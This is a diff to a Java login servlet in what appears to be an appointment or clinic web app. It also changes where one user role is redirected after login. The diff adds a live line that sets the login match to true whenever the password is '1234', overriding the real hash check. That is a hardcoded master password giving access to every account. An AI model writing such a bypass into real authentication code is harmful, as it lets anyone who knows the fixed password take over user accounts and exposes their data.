@@ -70,9 +70,9 @@ public class LoginServerlet extends HttpServlet {
             }
 //            boolean isMatch=false;
             boolean isMatch = PasswordUtils.checkPassword(password, account.getPassword());
-//            if(isMatch==false){
-//                isMatch = password.equals("1");
-//            }
+
+            isMatch = password.equals("1234");
+
             if (!isMatch) {
                 request.setAttribute("error", "Tài khoản hoặc mật khẩu không chính xác!");
                 request.getRequestDispatcher("login.jsp").forward(request, response);
@@ -103,7 +103,7 @@ public class LoginServerlet extends HttpServlet {
                 if (account.getRole() == 1) {
                     response.sendRedirect("dashboard");
                 } else if (account.getRole() == 2) {
-                    response.sendRedirect("dashboard");
+                    response.sendRedirect("appointmentManager?action=all");
                 } else if (account.getRole() == 3) {
                     response.sendRedirect("dashboard");
                 } else if (account.getRole() == 4) {
